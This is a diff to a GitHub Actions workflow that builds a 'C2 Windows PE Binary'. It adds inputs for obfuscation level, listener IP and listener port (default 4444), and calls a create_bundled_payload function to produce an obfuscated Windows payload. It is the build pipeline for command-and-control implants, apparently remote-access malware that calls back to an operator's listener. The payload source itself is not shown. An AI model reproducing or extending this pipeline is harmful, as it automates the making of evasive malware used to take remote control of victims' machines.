@@ -2,10 +2,21 @@ name: Build C2 Windows PE Binary
 
 on:
   push:
-    paths:
-      - 'payload.py'
     branches: [ main, master ]
   workflow_dispatch:
+    inputs:
+      obfuscation_level:
+        description: 'Niveau obfuscation (1-5)'
+        required: false
+        default: '5'
+      listener_ip:
+        description: 'IP Listener'
+        required: false
+        default: '0.0.0.0'
+      listener_port:
+        description: 'Port Listener'
+        required: false
+        default: '4444'
 
 jobs:
   build-windows:
@@ -26,8 +37,7 @@ jobs:
     
     - name: Build C2 Binary
       run: |
-        cd src
-        python c2_bundler_simple.py
+        python -c "from src.c2_bundler_simple import create_bundled_payload; create_bundled_payload('${{ github.event.inputs.listener_ip || '0.0.0.0' }}', ${{ github.event.inputs.listener_port || 4444 }}, ${{ github.event.inputs.obfuscation_level || 5 }}, 'windows')"
     
     - name: Verify PE binary format
       run: |
